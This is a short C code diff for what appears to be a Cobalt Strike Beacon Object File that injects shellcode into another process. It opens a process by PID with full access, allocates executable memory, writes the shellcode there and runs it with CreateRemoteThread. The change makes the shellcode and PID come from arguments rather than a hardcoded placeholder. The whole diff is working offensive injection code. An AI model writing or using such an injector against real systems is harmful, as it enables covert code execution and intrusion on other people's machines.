@@ -9,18 +9,23 @@ WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
 
 void go(char * argc, int len)
 {
-	unsigned char shellcode[] = "<insert C shellcode here>";
+	char* shellcode;
+	SIZE_T shell_len;
 	datap	parser;
 
 	BeaconDataParse(&parser, argc, len);
-	DWORD pid = BeaconDataShort(&parser);
+	DWORD pid = BeaconDataInt(&parser);
+	shell_len = BeaconDataLength(&parser);
+	shellcode = BeaconDataExtract(&parser, NULL);
 	HANDLE Process_Handle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, shell_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 	if (Alloc)
 	{
-		KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
+		KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
 		HANDLE Remote_Thread = KERNEL32$CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)Alloc, NULL, 0, NULL);
 		KERNEL32$CloseHandle(Remote_Thread);
 	}
+	
 	KERNEL32$CloseHandle(Process_Handle);
+
 }
